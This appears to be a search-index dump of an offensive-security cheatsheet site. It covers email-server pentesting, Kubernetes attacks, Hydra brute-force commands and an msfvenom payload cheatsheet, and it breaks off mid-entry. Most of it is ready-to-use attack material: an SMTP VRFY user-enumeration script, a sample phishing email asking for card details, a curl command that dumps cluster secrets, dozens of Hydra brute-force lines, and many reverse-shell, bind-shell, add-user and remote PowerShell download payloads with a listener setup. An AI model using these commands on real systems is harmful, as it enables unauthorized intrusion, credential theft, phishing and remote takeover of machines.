mutations and otherwise creating unique wordlists to test Username Enumeration Now we have an idea how what the usernames might look like and how we might go about harvesting them from the email server we can think about how to verify our findings. And we don't have to think too hard before we say \"sod it\" and write a Python script to do all the leg work for us. #!/usr/bin/python import socket import sys s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ip = sys.argv[1] input_file = sys.argv[2] connect = s.connect((ip,25)) banner = s.recv(1024) print(banner) with open(input_file) as payloads: for p in payloads: s.send(\"VRFY \" + p.rstrip() + '\\r\\n') result = s.recv(1024) print(result) s.close() Give that bad boy a file with usernames and it will test them against the server using the very useful VRFY command. If the server isn't setup to respond to the VRFY command then it'll just fail and this isn't an option for you on this machine sadly, and it's likely that you're going to need to find credentials elsewhere. Bruteforce When in doubt, get the sledgehammer out. Or in our case hydra : hydra -L userlist.txt -P passlist.txt -f $ip pop3 -V One thing to try here is to use the userlist.txt as the passlist.txt as resetting a users password to their name can be quite a common fallback for some service desks {: .prompt-info } Bruteforcing could take forever or it could be fast depending on the lists you've used. Patience is key and making sure you've done the VRFY step (if it was possible) to check that you're attacking valid users. Practical Exploitation Once you've got your target list and you've gained some access, it's on you to figure out how to abuse those new permissions. But here are some ideas in case you were struggling: Send the admins/users generic phishing emails Send mails to user groups Read peoples mails and look for passwords Abuse the mail and just troll people (don't do this) Poison emails with malicious payloads that fire when they land Unless the mail server itself is vulnerable then you're essentially just looking at using the server to gain addtional information and potentially credentials to access other services. PostFix Disclaimer No this is nothing to do with me warning you about using Postfix. It's got more to do with: /etc/postfix/disclaimer A harmless sounding file, right? What could be dangerous about a disclaimer? But then why would I be highlighting it in a pentesting guide if it wasn't worth mentioning? The /etc/postfix/disclaimer file is actually a BASH script that is sent along with every message. If for some reason we're able to modify that file then we'll be able to spawn a shell as whichever user is running the mail server simply by placing one at the top of the file under the shebang and setting up our listener accordingly. ExploitDB Link Explaining in Better Detail {: .prompt-info } Status Codes When you send a command to the server it will respond with a Status Code followed by some message relating to whatever it is you just asked the server to do. SMTP Status Code Lookup Conclusions Email is bad. Email servers are fun. Happy hacking.","title":"Email Pentesting"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#email-pentesting","text":"Email servers are complex beasts, if you've ever tried to configure one then you'll know the pain they can cause. With this in mind it's quite common to find them misconfigured in some way that we can take advantage of. For the purpose of this we'll make use of the following clipped nmap scan of an email server from HackTheBox as our reference point as it looks to be a pretty typical example of what you might find in the wild or on a corporate network. 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 25/tcp open smtp syn-ack ttl 63 Postfix smtpd 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) 110/tcp open pop3 syn-ack ttl 63 Dovecot pop3d 143/tcp open imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 993/tcp open ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 995/tcp open ssl/pop3 syn-ack ttl 63 Dovecot pop3d This will be explained in greater detail below, but the above example is a fairly standard mail server, you've got your SMTP daemon (Postfix) running to send mails, and you've also got something to retreive the mails, in this case we have Dovecot running both POP3 and IMAP daemons in SSL and non-SSL mode (that's 4 separate services for the purposes of enumeration). And your common or garden SSH port running on 22, just for completeness, which is generally how the administrator will access this machine. Take your time with email servers, aside from all the information they can give us there can often be vulnerabilities in the services themselves which can be exploited by interacting with them. Make sure to grab proper versions where possible to help with further enumeration. {: .prompt-info }","title":"Email Pentesting"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#understanding-email","text":"Before we can attack something we need to at least have an understanding of what it is. Email, or electronic mail is a terrible form of communication favoured by managers and the guy in the office who refuses to join Slack because it doesn't fit into his \"Workflow\". But it can still be useful for phishing and otherwise abusing to gain access to systems. Mail is a simple thing, you send mails to a server and someone uses a client to access those emails. In the case of Outlook or something like that they are constantly polling the server and will download new mails when they arrive directly to your local machine, otherwise it would be a manual process (remember having to hit \"Send/Receive\" to get Outlook to send your mail back in the day?) There are a few protocols we need to be familiar with to be able to properly interact with the email server. *We use telnet as it seems to handle the process a bit better than nc , though nc can do the job {: .prompt-info }","title":"Understanding Email"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#pop3","text":"The \"Post Office Protocol\", or POP3 as it's generally called. As the name might suggest this is the protocol responsible for actually delivering the mails to users. POP3 servers communicate with the other mail protocols and essentially serve as your mailbox, you can log into the POP3 server (typically running on 110, and 995 in the SSL instance) and download your mail to your local machine or just view it on the server.","title":"POP3"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#imap","text":"Another way of retreiving your mail, but it's much more suited to a larger environment as it handles multiple clients accessing the service simultaneously. By default IMAP runs on ports 143 and 993 respective of if it's using SSL or not with the latter (995) being the one running on SSL. IMAP is the most common protocol for mail access alongside POP3.","title":"IMAP"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#smtp","text":"Simple Mail Transport Protocol, or SMTP is the defacto standard for sending emails. And it's what we'll be using for most of our testing as we can interact with the protocol via telnet * from our Kali machine. Typically SMTP runs on port 25, with the secure version running on port 465 by default.","title":"SMTP"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#stmp-command-cheat-sheet","text":"Command Description HELO Basic server greeting (older systems) ELHO Enhanced server greeting (newer systems) MAIL FROM Who the mail is from (can be easily spoofed) RCPT TO Who to send the mail to? user@email.address SIZE Because size matters DATA The actual body/content of the message we want to send VRFY Verify that there is a valid user to receive an email (useful!) TURN Invert the client/server relationship without spawning a new connection AUTH For when we need to actually log in RSET Essentially a \"Cancel\" button, closes current action without terminating connection HELP DON'T PANIC! QUIT Because this has all just become a bit too much","title":"STMP Command Cheat Sheet"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#pop3-command-cheat-sheet","text":"USER <username> PASS <password> STAT LIST RETR DELE RSET TOP QUIT POP3 is a simple beast and will only ever reply in one of the following ways: +OK -ERR","title":"POP3 Command Cheat Sheet"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#sending-emails","text":"Before we can start hacking email servers we need to know the basic protocol for sending and interacting with them.","title":"Sending Emails"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#sending-someone-a-mail-smtp","text":"$> telnet 10.10.10.110 110 <SERVER BANNER GOES HERE> <Probably something about the creator> > HELO hacker@fakedomain.com OK > MAIL FROM: hacker@fakedomain.com OK > RCPT TO: someone@gullible.com OK > DATA <A message about how to end the mail, usually a \".\" on its own line> Dear Mr Guillible, We are writing to you today as our records show that you are known to respond to random unsolicited emails asking to hand over your information. Could you kindly send us you 16 digit card number and the 3 digit security code off the back of the credit card with the most money on it to the following email address: stealing@allthethings.com . <Confirmation message> > QUIT <closing connection> $>","title":"Sending Someone a Mail SMTP"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#reading-someones-mail-pop3","text":"$> telnet 10.10.10.110 25 <SERVER BANNER GOES HERE> <Probably something about the creator> USER someusername +OK PASS somepassword +OK Mailbox open, 200 messages LIST +OK Mailbox scan listing follows 1 1823 2 1825 3 1819 RETR 1 +OK 1823 octets --- MESSAGE CONTENT GOES HERE ---","title":"Reading Someones Mail POP3"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#harvesting-users","text":"The biggest problem you're going to have with testing an email server is figuring out who to target. The best place to get that sort of information would be the company website or ideally dump their entire AD listing of active users... but since we probably don't have access to the latter we'll have to make do with the former and try and scrape as much information as we can from a website or FTP server, or whatever else we can get our grubby paws on. This writeup isn't supposed to be an OSINT primer, but that's kind of where you should be looking for more information on how to gather the kind of information that would be useful for this (emails and Names) As well as names of potential people, we can also look at potential names for departments or teams as these will often have a shared mailbox even in small organisations.","title":"Harvesting Users"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#mutations","text":"Again this isn't what we're really here to discuss, but one of the things you need to bear in mind is all the potential ways a persons name could end up as a username. Take the simple and common English name David Smith as an example. davidsmith david.smith dsmith d.smith smithd smith.d smith.david smithdavid That's one simple name and I've not even covered all of the possible mutations, we've not even covered the case if there are multiple people with that name, do they get numbers? There is no simple answer here unfortunately, although a pretty good one to test early is david.smith as that seems to be a pretty common one in most enterprises I've seen.","title":"Mutations"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#useful-tools","text":"Your eyes (Voted #1 Most Useful Tool 2021) Screenshot tools like eyewitness cewl for scraping all of the words from a site/page My Password Generation CheatSheet could also be useful for generating mutations and otherwise creating unique wordlists to test","title":"Useful Tools"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#username-enumeration","text":"Now we have an idea how what the usernames might look like and how we might go about harvesting them from the email server we can think about how to verify our findings. And we don't have to think too hard before we say \"sod it\" and write a Python script to do all the leg work for us. #!/usr/bin/python import socket import sys s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ip = sys.argv[1] input_file = sys.argv[2] connect = s.connect((ip,25)) banner = s.recv(1024) print(banner) with open(input_file) as payloads: for p in payloads: s.send(\"VRFY \" + p.rstrip() + '\\r\\n') result = s.recv(1024) print(result) s.close() Give that bad boy a file with usernames and it will test them against the server using the very useful VRFY command. If the server isn't setup to respond to the VRFY command then it'll just fail and this isn't an option for you on this machine sadly, and it's likely that you're going to need to find credentials elsewhere.","title":"Username Enumeration"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#bruteforce","text":"When in doubt, get the sledgehammer out. Or in our case hydra : hydra -L userlist.txt -P passlist.txt -f $ip pop3 -V One thing to try here is to use the userlist.txt as the passlist.txt as resetting a users password to their name can be quite a common fallback for some service desks {: .prompt-info } Bruteforcing could take forever or it could be fast depending on the lists you've used. Patience is key and making sure you've done the VRFY step (if it was possible) to check that you're attacking valid users.","title":"Bruteforce"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#practical-exploitation","text":"Once you've got your target list and you've gained some access, it's on you to figure out how to abuse those new permissions. But here are some ideas in case you were struggling: Send the admins/users generic phishing emails Send mails to user groups Read peoples mails and look for passwords Abuse the mail and just troll people (don't do this) Poison emails with malicious payloads that fire when they land Unless the mail server itself is vulnerable then you're essentially just looking at using the server to gain addtional information and potentially credentials to access other services.","title":"Practical Exploitation"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#postfix-disclaimer","text":"No this is nothing to do with me warning you about using Postfix. It's got more to do with: /etc/postfix/disclaimer A harmless sounding file, right? What could be dangerous about a disclaimer? But then why would I be highlighting it in a pentesting guide if it wasn't worth mentioning? The /etc/postfix/disclaimer file is actually a BASH script that is sent along with every message. If for some reason we're able to modify that file then we'll be able to spawn a shell as whichever user is running the mail server simply by placing one at the top of the file under the shebang and setting up our listener accordingly. ExploitDB Link Explaining in Better Detail {: .prompt-info }","title":"PostFix Disclaimer"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#status-codes","text":"When you send a command to the server it will respond with a Status Code followed by some message relating to whatever it is you just asked the server to do. SMTP Status Code Lookup","title":"Status Codes"},{"location":"Cheatsheets/General/2022-10-04-pentesting-email-servers/#conclusions","text":"Email is bad. Email servers are fun. Happy hacking.","title":"Conclusions"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/","text":"Pentesting Kubernetes Useful Links: Risky Permissions Guide: Part 1 Guide: Part 2 Guide: Part 3 OpenShift Pentesting Kubernetes Outline Kubernetes or k8s is a \"container\" orchestration platform, designed to automate deployment, scaling and management of containerized applications (Docker images and such) There are two main parts to the k8s architecture: Master Node Worker Node A cluster is made up of a Master node and N Worker nodes. The job of the Master node is to act as a command and control (c2) server for the cluster and provide a control for all of the worker nodes. The Master node has many different containers running on it, but the main one of interest is the kube-apiserver which as it's name suggests, is the API server that k8s uses to orchestrate the cluster . All the traffic in the cluster is passed through this container. It also exposes an API that allows communication using a client (kubectl or customized one) The kube-apiserver is the only container that communicates with the etcd, which is the database of the cluster and contains all the sensitive data (tokens, passwords, etc.) That bit is important for our upcoming testing as it will mostly be the goal to be able to gain access to this API so that we can do things we're not supposed to be able to do. On the worker nodes, the primary agent is the kubelet. It receives instructions from the kube-apisever and is responsible for executing the instruction such as deploying pods, which are logical groups of one or more containers, or downloading the image for the containers. There are two main \"users\" of a k8s cluster : Human users Service accounts Human users are exactly that, humans that are using the system. Service accounts are accounts that are configured for a particular pod to communicate with the kube-apiserver . Connecting and Using a k8s Cluster There are three stages that a user or service account must go through to connect to the cluster in order to receive or carry out instructions: Authentication Authorization Admission Control This loop is performed whenever an account sends a request to the kube_apiserver , the request could be something as simple as \"list all pods\" or something a bit more restricted such as creating a new service account. Authentication This is usually done with either a certificate, a token or using Basic Authentication (i.e. username & password), there are also ways that it can be configured to be used with things like LDAP, but that's just an abstraction of the authentication process. Authorization Once the users token, certificate, or username and password combination has been verified by the cluster k8s then checks that user or service accounts permissions to see if they are allowed to perform the requested action (i.e. download a new image) Admission Control These are pieces of software that are able to acccess the content that is being requested by the users or service accounts, there are lots of these \"Admission Controllers\": k8s Docs on Admission Controllers RBAC (Role Based Access Control) The RBAC uses specific \u201cresources\u201d and \u201cverbs\u201d to grant access: Resources are the information that can be accessed (e.g., information about pods, read secrets, etc.\u2019). Verbs are how the resources can be accessed (e.g., list secrets, get pods, watch, etc.\u2019). Tools KubiScan RBAC-Audit Attack Methods Listing Secrets An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \u201ckube-system\u201d namespace: curl -v -H \u201cAuthorization: Bearer <jwt_token>\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ Access Any Resource or Verb If you have access to see the RBAC config file then you can check to see the privileges for the cluster: Access Any Resource Pod Creation Create/Update Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs Privilege to Use Pods/Exec Privilege to Get/Patch Rolebindings Impersonating a Privileged Account We're now looking at the TypeScript to see if we can find an XSS because the application is using websockets to speak back to the pods, so if we can find an XSS then we can send a proper request to the pods and potentially get RCE or information leakage","title":"Pentesting Kubernetes"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#pentesting-kubernetes","text":"Useful Links: Risky Permissions Guide: Part 1 Guide: Part 2 Guide: Part 3 OpenShift Pentesting","title":"Pentesting Kubernetes"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#kubernetes-outline","text":"Kubernetes or k8s is a \"container\" orchestration platform, designed to automate deployment, scaling and management of containerized applications (Docker images and such) There are two main parts to the k8s architecture: Master Node Worker Node A cluster is made up of a Master node and N Worker nodes. The job of the Master node is to act as a command and control (c2) server for the cluster and provide a control for all of the worker nodes. The Master node has many different containers running on it, but the main one of interest is the kube-apiserver which as it's name suggests, is the API server that k8s uses to orchestrate the cluster . All the traffic in the cluster is passed through this container. It also exposes an API that allows communication using a client (kubectl or customized one) The kube-apiserver is the only container that communicates with the etcd, which is the database of the cluster and contains all the sensitive data (tokens, passwords, etc.) That bit is important for our upcoming testing as it will mostly be the goal to be able to gain access to this API so that we can do things we're not supposed to be able to do. On the worker nodes, the primary agent is the kubelet. It receives instructions from the kube-apisever and is responsible for executing the instruction such as deploying pods, which are logical groups of one or more containers, or downloading the image for the containers. There are two main \"users\" of a k8s cluster : Human users Service accounts Human users are exactly that, humans that are using the system. Service accounts are accounts that are configured for a particular pod to communicate with the kube-apiserver .","title":"Kubernetes Outline"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#connecting-and-using-a-k8s-cluster","text":"There are three stages that a user or service account must go through to connect to the cluster in order to receive or carry out instructions: Authentication Authorization Admission Control This loop is performed whenever an account sends a request to the kube_apiserver , the request could be something as simple as \"list all pods\" or something a bit more restricted such as creating a new service account.","title":"Connecting and Using a k8s Cluster"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#authentication","text":"This is usually done with either a certificate, a token or using Basic Authentication (i.e. username & password), there are also ways that it can be configured to be used with things like LDAP, but that's just an abstraction of the authentication process.","title":"Authentication"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#authorization","text":"Once the users token, certificate, or username and password combination has been verified by the cluster k8s then checks that user or service accounts permissions to see if they are allowed to perform the requested action (i.e. download a new image)","title":"Authorization"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#admission-control","text":"These are pieces of software that are able to acccess the content that is being requested by the users or service accounts, there are lots of these \"Admission Controllers\": k8s Docs on Admission Controllers","title":"Admission Control"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#rbac-role-based-access-control","text":"The RBAC uses specific \u201cresources\u201d and \u201cverbs\u201d to grant access: Resources are the information that can be accessed (e.g., information about pods, read secrets, etc.\u2019). Verbs are how the resources can be accessed (e.g., list secrets, get pods, watch, etc.\u2019).","title":"RBAC (Role Based Access Control)"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#tools","text":"KubiScan RBAC-Audit","title":"Tools"},{"location":"Cheatsheets/General/Kubernetes_Pentesting/#attack-methods","text":"Listing Secrets An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \u201ckube-system\u201d namespace: curl -v -H \u201cAuthorization: Bearer <jwt_token>\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ Access Any Resource or Verb If you have access to see the RBAC config file then you can check to see the privileges for the cluster: Access Any Resource Pod Creation Create/Update Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs Privilege to Use Pods/Exec Privilege to Get/Patch Rolebindings Impersonating a Privileged Account We're now looking at the TypeScript to see if we can find an XSS because the application is using websockets to speak back to the pods, so if we can find an XSS then we can send a proper request to the pods and potentially get RCE or information leakage","title":"Attack Methods"},{"location":"Cheatsheets/General/cheatsheet_js/","text":"Commands Command Description curl http:/SERVER_IP:PORT/ cURL GET request curl -s http:/SERVER_IP:PORT/ -X POST cURL POST request curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\" cURL POST request with data alias curlx=\"curl -x http://127.0.0.1:8080 \" proxy a cURL request through Burp echo bullsec \\| base64 base64 encode echo ENCODED_B64 \\| base64 -d base64 decode echo bullsec \\| xxd -p hex encode echo ENCODED_HEX \\| xxd -p -r hex decode echo bullsec \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 encode echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 decode Deobfuscation Websites Website JS Console Prettier Beautifier JSNice Misc Command Description ctrl+u Show HTML source code in Firefox","title":"Commands"},{"location":"Cheatsheets/General/cheatsheet_js/#commands","text":"Command Description curl http:/SERVER_IP:PORT/ cURL GET request curl -s http:/SERVER_IP:PORT/ -X POST cURL POST request curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\" cURL POST request with data alias curlx=\"curl -x http://127.0.0.1:8080 \" proxy a cURL request through Burp echo bullsec \\| base64 base64 encode echo ENCODED_B64 \\| base64 -d base64 decode echo bullsec \\| xxd -p hex encode echo ENCODED_HEX \\| xxd -p -r hex decode echo bullsec \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 encode echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m' rot13 decode","title":"Commands"},{"location":"Cheatsheets/General/cheatsheet_js/#deobfuscation-websites","text":"Website JS Console Prettier Beautifier JSNice","title":"Deobfuscation Websites"},{"location":"Cheatsheets/General/cheatsheet_js/#misc","text":"Command Description ctrl+u Show HTML source code in Firefox","title":"Misc"},{"location":"Cheatsheets/General/hydra_cheat_sheet/","text":"Hydra Cheat Sheet Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V Hydra SMTP Bruteforce hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing","title":"Hydra Cheat Sheet"},{"location":"Cheatsheets/General/hydra_cheat_sheet/#hydra-cheat-sheet","text":"Command Description hydra -P password-file.txt -v $ip snmp Hydra brute force against SNMP hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp Hydra FTP known user and rockyou password list hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh Hydra SSH using list of users and passwords hydra -v -V -u -L users.txt -p \"\" -t 1 -u $ip ssh Hydra SSH using a known password and a username list hydra $ip -s 22 ssh -l -P big_wordlist.txt Hydra SSH Against Known username on port 22 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V Hydra POP3 Brute Force hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V Hydra SMTP Bruteforce hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin Hydra attack http get 401 login with a dictionary hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip Hydra attack Windows Remote Desktop with rockyou hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb Hydra brute force SMB user with rockyou hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' Hydra brute force a Wordpress admin login hydra -L usernames.txt -P passwords.txt $ip smb -V -f SMB Brute Forcing hydra -L users.txt -P passwords.txt $ip ldap2 -V -f LDAP Brute Forcing","title":"Hydra Cheat Sheet"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/","text":"MSFVenom Cheatsheet MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD --list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf Linux Meterpreter reverse shell x86 multi stage msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux Meterpreter bind shell x86 multi stage msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux bind shell x64 single stage msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux reverse shell x64 single stage msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows Meterpreter reverse shell msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe > shell.exe Windows Meterpreter http reverse shell msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe Windows Meterpreter bind shell msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows CMD Multi Stage msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows CMD Single Stage msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe Windows add user msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho Mac Reverse Shell msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho Mac Bind shell msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py Python Shell msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh BASH Shell msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl PERL Shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp ASP Meterpreter shell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp JSP Shell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war WAR Shell msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php pbcopy && echo '?php ' msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php Php Reverse Shell msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\\\"\" -f python Windows Exec Nishang Powershell in python msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b \"\\x04\\xA0\" Bad characters shikata_ga_nai msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b \"\\x04\\xA0\" Bad characters fnstenv_mov Multihandler Listener To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload, msf>use exploit/multi/handler msf>set payload windows/meterpreter/reverse_tcp msf>set lhost <IP> msf>set lport <PORT> msf> set ExitOnSession false msf>exploit -j The -j option is to keep all the connected session in the background. References","title":"MSFVenom Cheatsheet"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/#msfvenom-cheatsheet","text":"MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD --list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf Linux Meterpreter reverse shell x86 multi stage msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux Meterpreter bind shell x86 multi stage msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux bind shell x64 single stage msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf Linux reverse shell x64 single stage msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows Meterpreter reverse shell msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\" -f exe > shell.exe Windows Meterpreter http reverse shell msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe Windows Meterpreter bind shell msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows CMD Multi Stage msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe Windows CMD Single Stage msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe Windows add user msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho Mac Reverse Shell msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho Mac Bind shell msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py Python Shell msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh BASH Shell msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl PERL Shell msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp ASP Meterpreter shell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp JSP Shell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war WAR Shell msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php pbcopy && echo '?php ' msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php Php Reverse Shell msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\\\"\" -f python Windows Exec Nishang Powershell in python msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b \"\\x04\\xA0\" Bad characters shikata_ga_nai msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b \"\\x04\\xA0\" Bad characters fnstenv_mov","title":"MSFVenom Cheatsheet"},{"location":"Cheatsheets/General/msfvenom_cheatsheet/#multihandler-listener","text":"To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload, msf>use exploit/multi/handler msf>set payload windows/meterpreter/reverse_tcp msf>set lhost <IP> msf>set lport <PORT> msf> set ExitOnSession false msf>exploit -j The -j option is to keep all the connected session in the background.","title":"Multihandler 